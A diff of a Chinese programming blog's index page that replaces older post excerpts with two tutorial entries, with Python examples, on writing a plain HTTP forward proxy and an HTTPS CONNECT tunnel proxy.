+    <a href="/2017/08/20/由浅入深写代理-7-http-代理-md/" class="article-date">
+  <time datetime="2017-08-20T08:36:06.000Z" itemprop="datePublished">2017-08-20</time>
 </a>
     
   </div>
@@ -220,7 +235,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2017/02/04/过滤豆瓣租房小组中介贴之 python 实现 布隆过滤器（三）/">过滤豆瓣租房小组中介贴之 python 实现 布隆过滤器（三）</a>
+      <a class="article-title" href="/2017/08/20/由浅入深写代理-7-http-代理-md/">由浅入深写代理(7)-https-代理.md</a>
     </h1>
   
 
@@ -228,20 +243,31 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>其实这篇文章跟过滤中介贴没什么关系，只是在爬豆瓣小组的时候遇到的一点思考，我们知道，其实爬虫就是循环的爬取网站的 url，但是怎么判断爬取的 url 是否重复呢，最简单的，维护一个列表，每次循环查找，很明显效率很低。进阶的，采用哈希表，每次查询都是 O(1), 看上去不错。不过如果一旦 url 大到一定程度时，单台机器的内存肯定吃不消，这个时候分布式方案就呼之欲出，变得越来越复杂。那么能不能在牺牲一点点精确性的前提下，有简单的方案呢，答案是肯定的。这就是 布隆过滤器。<br>
-        
-          <p class="article-more-link">
-            <a href="/2017/02/04/过滤豆瓣租房小组中介贴之 python 实现 布隆过滤器（三）/#more">Read More</a>
-          </p>
-        
+        <p>本文主要实现隧道代理，让 https 请求也能代理。</p>
+<p>隧道代理的原理是：<br><code>HTTP 客户端通过 CONNECT 方法请求隧道代理创建一条到达任意目的服务器和端口的 TCP 连接，并对客户端和服务器之间的后继数据进行盲转发。</code></p>
+<p><img src="/media/15032206534564.jpg" alt=""></p>
+<p>步骤如下</p>
+<ol>
+<li><p>客户端发送一个 http CONNECT 请求<br><code>CONNECT baidu.com:443 HTTP/1.1</code></p>
+</li>
+<li><p>代理收到这样的请求后，拿到目标服务器域名及端口，与目标服务端建立 TCP 连接，并响应给浏览器这样一个 HTTP 报文：<br> <code>HTTP/1.1 200 Connection Established</code></p>
+</li>
+<li>建立完隧道以后，客户端与目标服务器照之前的方式发送请求，代理节点只是做转发功能，无从知道转发的流量具体是什么    </li>
+</ol>
+<p>看代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> socket</div><div class="line"><span class="keyword">import</span> select</div><div class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyHandler</span><span class="params">(BaseHTTPRequestHandler)</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_data</span><span class="params">(self, sock, data)</span>:</span></div><div class="line">        print(data)</div><div class="line">        bytes_sent = <span class="number">0</span></div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            r = sock.send(data[bytes_sent:])</div><div class="line">            <span class="keyword">if</span> r &lt; <span class="number">0</span>:</div><div class="line">                <span class="keyword">return</span> r</div><div class="line">            bytes_sent += r</div><div class="line">            <span class="keyword">if</span> bytes_sent == len(data):</div><div class="line">                <span class="keyword">return</span> bytes_sent</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_tcp</span><span class="params">(self, sock, remote)</span>:</span></div><div class="line">        <span class="comment"># 处理 client socket 和 remote socket 的数据流</span></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            fdset = [sock, remote]</div><div class="line">            <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">                <span class="comment"># 用 IO 多路复用 select 监听套接字是否有数据流</span></div><div class="line">                r, w, e = select.select(fdset, [], [])</div><div class="line">                <span class="keyword">if</span> sock <span class="keyword">in</span> r:</div><div class="line">                    data = sock.recv(<span class="number">4096</span>)</div><div class="line">                    <span class="keyword">if</span> len(data) &lt;= <span class="number">0</span>:</div><div class="line">                        <span class="keyword">break</span></div><div class="line">                    result = self.send_data(remote, data)</div><div class="line">                    <span class="keyword">if</span> result &lt; len(data):</div><div class="line">                        <span class="keyword">raise</span> Exception(<span class="string">'failed to send all data'</span>)</div><div class="line"></div><div class="line">                <span class="keyword">if</span> remote <span class="keyword">in</span> r:</div><div class="line">                    data = remote.recv(<span class="number">4096</span>)</div><div class="line">                    <span class="keyword">if</span> len(data) &lt;= <span class="number">0</span>:</div><div class="line">                        <span class="keyword">break</span></div><div class="line">                    result = self.send_data(sock, data)</div><div class="line">                    <span class="keyword">if</span> result &lt; len(data):</div><div class="line">                        <span class="keyword">raise</span> Exception(<span class="string">'failed to send all data'</span>)</div><div class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">            <span class="keyword">raise</span>(e)</div><div class="line">        <span class="keyword">finally</span>:</div><div class="line">            sock.close()</div><div class="line">            remote.close()</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_CONNECT</span><span class="params">(self)</span>:</span></div><div class="line"></div><div class="line">        <span class="comment"># 解析出 host 和 port</span></div><div class="line">        uri = self.path.split(<span class="string">":"</span>)</div><div class="line">        host, port = uri[<span class="number">0</span>], int(uri[<span class="number">1</span>])</div><div class="line">        host_ip = socket.gethostbyname(host)</div><div class="line"></div><div class="line">        remote_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">        remote_sock.connect((host_ip, port))</div><div class="line">        <span class="comment"># 告诉客户端 CONNECT 成功</span></div><div class="line">        self.wfile.write(<span class="string">"&#123;protocol_version&#125; 200 Connection Established\r\n\r\n"</span>.format(protocol_version=self.protocol_version).encode())</div><div class="line"></div><div class="line">        <span class="comment"># 转发请求</span></div><div class="line">        self.handle_tcp(self.connection, remote_sock)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        server = HTTPServer((<span class="string">''</span>, <span class="number">8888</span>), ProxyHandler)</div><div class="line">        server.serve_forever()</div><div class="line">    <span class="keyword">except</span> KeyboardInterrupt:</div><div class="line">        server.socket.close()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
+<p>有一个 <code>do_CONNECT</code> 函数的处理，实现之前隧道的建立，然后 <code>handle_tcp</code> ，代码和之前 socks5 代理是一样的。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://imququ.com/post/web-proxy.html" target="_blank" rel="external">https://imququ.com/post/web-proxy.html</a></li>
+</ul>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/02/04/过滤豆瓣租房小组中介贴之 python 实现 布隆过滤器（三）/" data-id="cj012226m0011dfo00p6ubf7i" class="article-share-link">Teilen</a>
+      <a data-url="http://yoursite.com/2017/08/20/由浅入深写代理-7-http-代理-md/" data-id="cj6u5abmi00191jo07jwbr0v3" class="article-share-link">Teilen</a>
       
       
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/algorithm/">algorithm</a></li></ul>
-
     </footer>
   </div>
   
@@ -250,10 +276,10 @@
 
 
   
-    <article id="post-ghost-博客中文搜索插件" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-由浅入深写代理-6-http-代理-md" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2016/12/21/ghost-博客中文搜索插件/" class="article-date">
-  <time datetime="2016-12-21T09:59:44.000Z" itemprop="datePublished">2016-12-21</time>
+    <a href="/2017/08/20/由浅入深写代理-6-http-代理-md/" class="article-date">
+  <time datetime="2017-08-20T07:26:36.000Z" itemprop="datePublished">2017-08-20</time>
 </a>
     
   </div>
@@ -264,7 +290,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/21/ghost-博客中文搜索插件/">ghost 博客中文搜索插件</a>
+      <a class="article-title" href="/2017/08/20/由浅入深写代理-6-http-代理-md/">由浅入深写代理(6)-http-代理.md</a>
     </h1>
   
 
@@ -272,22 +298,27 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>在用 ghost 博客的时候，发现一直没有合适的搜索插件，主要是官方没提供相应的 search api, <a href="https://github.com/dreampiggy/ghostHunter">ghostHunter</a> 采用 api 获取所有文章的方式，然后用 lunir 做全文搜索。但是 lunir 本身不支持中文分词，虽然有小伙伴提供了中文分词的方案，但是为了一个简单的搜索加了好大一堆库，感觉还是不怎么经济。</p>
-<p>所以鉴于此，根据 ghsotHunter 改了个简单的插件，为了效率，api 获取的时候只取 title, 所以只支持简单的 title 匹配搜索, 代码如下：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> searchResult = [];</div><div class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; <span class="keyword">this</span>.blogData.length; i++) &#123;</div><div class="line">    <span class="keyword">if</span>(value &amp;&amp; <span class="keyword">this</span>.blogData[i].title.toLowerCase().search(value.toLowerCase()) != <span class="number">-1</span>)&#123;</div><div class="line">    searchResult.push(<span class="keyword">this</span>.blogData[i]);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-        
-          <p class="article-more-link">
-            <a href="/2016/12/21/ghost-博客中文搜索插件/#more">Read More</a>
-          </p>
-        
+        <p>本文讲 http 代理，顾名思义，http 代理代理的是 http 请求，其实这里面分两类</p>
+<pre><code>* 普通代理 这种代理扮演的是「中间人」角色，对于连接到它的客户端来说，它是服务端；对于要连接的服务端来说，它是客户端。它就负责在两端之间来回传送 HTTP 报文。
+* 隧道代理。它通过 HTTP 协议正文部分（Body）完成通讯，以 HTTP 的方式实现任意基于 TCP 的应用层协议代理。这种代理使用 HTTP 的 CONNECT 方法建立连接。
+</code></pre><p>通俗一点讲，普通代理解析 http 包，然后将请求转发到目标地址，但是没法解析 https 的包，所以也就没法代理 https 的请求，但是隧道代理可以代理 https 的请求或者其他的一些协议请求。</p>
+<h3 id="0x01-普通代理"><a href="#0x01-普通代理" class="headerlink" title="0x01 普通代理"></a>0x01 普通代理</h3><p>代码很简单</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> socket</div><div class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</div><div class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyHandler</span><span class="params">(BaseHTTPRequestHandler)</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recv_data_from_remote</span><span class="params">(self, sock)</span>:</span></div><div class="line">        data = <span class="string">b''</span></div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            recv_data = sock.recv(<span class="number">4096</span>)</div><div class="line">            <span class="keyword">if</span> <span class="keyword">not</span> recv_data:</div><div class="line">                <span class="keyword">break</span></div><div class="line">            data += recv_data</div><div class="line">        sock.close()</div><div class="line">        <span class="keyword">return</span> data</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="comment"># 解析 GET 请求信息</span></div><div class="line">        uri = urlparse(self.path)</div><div class="line">        scheme, host, path = uri.scheme, uri.hostname, uri.path</div><div class="line">        host_ip = socket.gethostbyname(host)</div><div class="line">        port = <span class="number">443</span> <span class="keyword">if</span> scheme == <span class="string">"https"</span> <span class="keyword">else</span> <span class="number">80</span></div><div class="line"></div><div class="line">        <span class="comment"># 为了简单起见，Connection 都为 close, 也就不需要 Proxy-Connection 判断了</span></div><div class="line">        <span class="keyword">del</span> self.headers[<span class="string">'Proxy-Connection'</span>]</div><div class="line">        self.headers[<span class="string">'Connection'</span>] = <span class="string">'close'</span></div><div class="line"></div><div class="line">        <span class="comment"># 构造新的 http 请求</span></div><div class="line">        send_data = <span class="string">"GET &#123;path&#125; &#123;protocol_version&#125;\r\n"</span>.format(path=path, protocol_version=self.protocol_version)</div><div class="line">        headers = <span class="string">''</span></div><div class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> self.headers.items():</div><div class="line">            headers += <span class="string">"&#123;key&#125;: &#123;value&#125;\r\n"</span>.format(key=key, value=value)</div><div class="line">        headers += <span class="string">'\r\n'</span></div><div class="line">        send_data += headers</div><div class="line"></div><div class="line">        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">        sock.connect((host_ip, port))</div><div class="line">        <span class="comment"># 发送请求到目标地址</span></div><div class="line">        sock.sendall(send_data.encode())</div><div class="line">        data = self._recv_data_from_remote(sock)</div><div class="line"></div><div class="line">        self.wfile.write(data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        server = HTTPServer((<span class="string">''</span>, <span class="number">8888</span>), ProxyHandler)</div><div class="line">        server.serve_forever()</div><div class="line">    <span class="keyword">except</span> KeyboardInterrupt:</div><div class="line">        server.socket.close()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
+<p>这里面就实现了 get 请求的转发，只用单线程的方式来处理，其他的有兴趣的同学可以自己扩展下。<br>看下效果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python3 http_server.py</div></pre></td></tr></table></figure>
+<p><img src="/media/15032177986462.jpg" alt=""></p>
+<p>配置完代理后可以发现 http 的请求都能正常转发，但是 https 的都没法识别。</p>
+<p>下篇教程看如何通过隧道代理解决这个问题。</p>
+<p>参考资料</p>
+<pre><code>* https://imququ.com/post/web-proxy.html
+* http://www.lyyyuna.com/2016/01/16/http-proxy-get1/
+</code></pre>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2016/12/21/ghost-博客中文搜索插件/" data-id="cj01222490005dfo0iuxhh5l9" class="article-share-link">Teilen</a>
+      <a data-url="http://yoursite.com/2017/08/20/由浅入深写代理-6-http-代理-md/" data-id="cj6u5abmg00171jo08iv679h1" class="article-share-link">Teilen</a>
       
       
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ghost/">ghost</a></li></ul>
-
     </footer>
   </div>
   
@@ -300,7 +331,7 @@
 
   <nav id="page-nav">
     
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">weiter &raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/2/">weiter &raquo;</a>
   </nav>
 
 </section>
@@ -314,7 +345,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/DIY/">DIY</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/algorithm/">algorithm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django源码/">django源码</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ghost/">ghost</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python-入门/">python 入门</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web开发/">web开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/思考/">思考</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数据结构/">数据结构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/计算机系统/">计算机系统</a></li></ul>
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/DIY/">DIY</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/algorithm/">algorithm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django源码/">django源码</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ghost/">ghost</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python-入门/">python 入门</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web开发/">web开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/代理/">代理</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/思考/">思考</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数据结构/">数据结构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/计算机系统/">计算机系统</a></li></ul>
     </div>
   </div>
 
@@ -324,7 +355,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/DIY/" style="font-size: 10px;">DIY</a> <a href="/tags/algorithm/" style="font-size: 16.67px;">algorithm</a> <a href="/tags/django源码/" style="font-size: 10px;">django源码</a> <a href="/tags/ghost/" style="font-size: 10px;">ghost</a> <a href="/tags/python-入门/" style="font-size: 20px;">python 入门</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/web开发/" style="font-size: 10px;">web开发</a> <a href="/tags/思考/" style="font-size: 10px;">思考</a> <a href="/tags/数据结构/" style="font-size: 13.33px;">数据结构</a> <a href="/tags/计算机系统/" style="font-size: 10px;">计算机系统</a>
+      <a href="/tags/DIY/" style="font-size: 10px;">DIY</a> <a href="/tags/algorithm/" style="font-size: 16.67px;">algorithm</a> <a href="/tags/django源码/" style="font-size: 10px;">django源码</a> <a href="/tags/ghost/" style="font-size: 10px;">ghost</a> <a href="/tags/python-入门/" style="font-size: 20px;">python 入门</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/web开发/" style="font-size: 10px;">web开发</a> <a href="/tags/代理/" style="font-size: 16.67px;">代理</a> <a href="/tags/思考/" style="font-size: 10px;">思考</a> <a href="/tags/数据结构/" style="font-size: 13.33px;">数据结构</a> <a href="/tags/计算机系统/" style="font-size: 10px;">计算机系统</a>
     </div>
   </div>
 
@@ -333,7 +364,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archiv</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li></ul>
     </div>
   </div>
 
@@ -346,23 +377,23 @@
       <ul>
         
           <li>
-            <a href="/2017/03/08/写给前端的甩锅指南/">写给前端的甩锅指南</a>
+            <a href="/2017/08/26/由浅入深写代理-10-反向代理/">由浅入深写代理(10)-内网穿透</a>
           </li>
         
           <li>
-            <a href="/2017/03/06/过滤豆瓣租房小组中介贴之-python-实现-k-近邻算法（四）/">过滤豆瓣租房小组中介贴之 python 实现 k 近邻算法（四）</a>
+            <a href="/2017/08/20/由浅入深写代理-8-shadowsocks-代理-md/">由浅入深写代理(8)-ss-代理.md</a>
           </li>
         
           <li>
-            <a href="/2017/02/04/过滤豆瓣租房小组中介贴之 python 实现 TF-IDF 算法（二）/">过滤豆瓣租房小组中介贴之 python 实现 TF-IDF 算法（二）</a>
+            <a href="/2017/08/20/由浅入深写代理-9-ssh-代理-md/">由浅入深写代理(9)-ssh-代理.md</a>
           </li>
         
           <li>
-            <a href="/2017/02/04/过滤豆瓣租房小组中介贴之 python 实现 布隆过滤器（三）/">过滤豆瓣租房小组中介贴之 python 实现 布隆过滤器（三）</a>
+            <a href="/2017/08/20/由浅入深写代理-7-http-代理-md/">由浅入深写代理(7)-https-代理.md</a>
           </li>
         
           <li>
-            <a href="/2016/12/21/ghost-博客中文搜索插件/">ghost 博客中文搜索插件</a>
+            <a href="/2017/08/20/由浅入深写代理-6-http-代理-md/">由浅入深写代理(6)-http-代理.md</a>
           </li>
         
       </ul>
